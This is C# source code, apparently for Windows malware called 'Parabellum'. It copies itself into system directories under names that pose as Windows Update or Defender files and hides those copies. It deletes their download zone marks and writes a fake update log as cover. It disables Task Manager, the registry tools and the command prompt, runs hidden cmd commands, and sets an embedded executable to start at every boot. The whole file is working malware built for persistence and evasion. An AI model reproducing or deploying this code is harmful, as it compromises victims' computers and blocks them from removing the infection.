using static Vanara.PInvoke.Kernel32;
using Vanara.PInvoke;
using System.IO;
using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;

namespace Parabellum
{
    public class PayloadSystem
    {
        public static void HideFile(string fileName)
        {
            SetFileAttributes(fileName, FileFlagsAndAttributes.FILE_ATTRIBUTE_HIDDEN
                | FileFlagsAndAttributes.FILE_ATTRIBUTE_SYSTEM | FileFlagsAndAttributes.FILE_ATTRIBUTE_DIRECTORY);

            DeleteFile(fileName + ":Zone.Identifier");
        }

        public static void Extract(string NamespaceName, string OutPath, string InternalPath, string ResourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(NamespaceName + "." + (InternalPath == "" ? "" : InternalPath + ".") + ResourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(OutPath + "\\" + ResourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
            {
                w.Write(r.ReadBytes((int)s.Length));
            }
        }
        public static void FileSpreading()
        {
            Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Tools"));

            string[] paths =
            {
                Path.Combine(Environment.SystemDirectory, "Parabellum.exe"),//=============================================>    C:\Win\Sys32\Parabellum.exe
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Parabellum.exe"),//============>    C:\Win\Parabellum.exe
                Path.Combine(Environment.SystemDirectory, "ServerWindowsUpdate.exe"),//====================================>    C:\Win\Sys32\ServerWindowsUpdate.exe
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "MilitaryDog.png.exe"),//====>    C:\Users\%name_user%\pictures\MilitaryDog.png.exe
Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Tools", "WinUpdateBackup.exe"),//==>    C:\Program Files\Windows Tools\WinUpdateBackup.exe
            };

            foreach (var pathsDest in paths)
            {
                if(!File.Exists(pathsDest))
                {
                    File.Copy(Application.ExecutablePath, pathsDest);
                    HideFile(pathsDest);
                }
                else
                {
                    continue;
                }
            }

            File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Tools", "WinUpdateBackupDat.log"), "[2025-02-09 14:32:18] [INFO] Starting update data backup...\r\n" +
                "[2025-02-09 14:32:19] [INFO] Verifying file integrity...\r\n" +
                "[2025-02-09 14:32:21] [INFO] Update files successfully verified.\r\n" +
                "[2025-02-09 14:32:23] [INFO] Creating backup copy...\r\n" +
                "[2025-02-09 14:32:28] [INFO] Backup completed: C:\\Windows\\Backup\\WinUpdate_20250209.bak\r\n" +
                "[2025-02-09 14:32:30] [INFO] Checking system permissions...\r\n" +
                "[2025-02-09 14:32:31] [WARNING] Elevated permissions not detected. Retrying...\r\n" +
                "[2025-02-09 14:32:34] [INFO] Permissions successfully adjusted.\r\n" +
                "[2025-02-09 14:32:36] [INFO] Syncing with Microsoft update servers...\r\n" +
                "[2025-02-09 14:32:41] [ERROR] Failed to connect to update server. Error code: 0x8024401F\r\n" +
                "[2025-02-09 14:32:43] [INFO] Retrying connection in 30 seconds...\r\n" +
                "[2025-02-09 14:33:13] [INFO] Connection re-established.\r\n" +
                "[2025-02-09 14:33:16] [INFO] Backup successfully uploaded to secure storage.\r\n" +
                "[2025-02-09 14:33:20] [INFO] Process completed successfully.\r\n\r\n" +
                "[2025-02-09 14:33:22] [INFO] Final status: OK\r\n\r\n\r\n" +
                "[2025-02-09 14:35:12] [ATTENTION!] PLEASE DO NOT DELETE OR CHANGE THIS FOLDER!");
        }

        public static void DisableToolsWin()
        {
            RegistryKey rRegTask = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rRegTask.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            rRegTask.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            RegistryKey rRegCmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            rRegCmd.SetValue("DisableCMD", 1, RegistryValueKind.DWord);

            rRegTask.Close();
            rRegCmd.Close();
        }

        public static void ExecCmd(string cmd)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/k " + cmd
            });
        }

        public static void Anti_FixBootloader()
        {
            Extract("Parabellum", Environment.SystemDirectory, "Resources", "WindowsDefenderService.exe");
            HideFile(Path.Combine(Environment.SystemDirectory, "WindowsDefenderService.exe"));

            Sleep(1000);

            RegistryKey rRegRun = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            rRegRun.SetValue("Windows Defender", Path.Combine(Environment.SystemDirectory, "WindowsDefenderService.exe"), RegistryValueKind.String);
            rRegRun.Close();
        }
    }
}
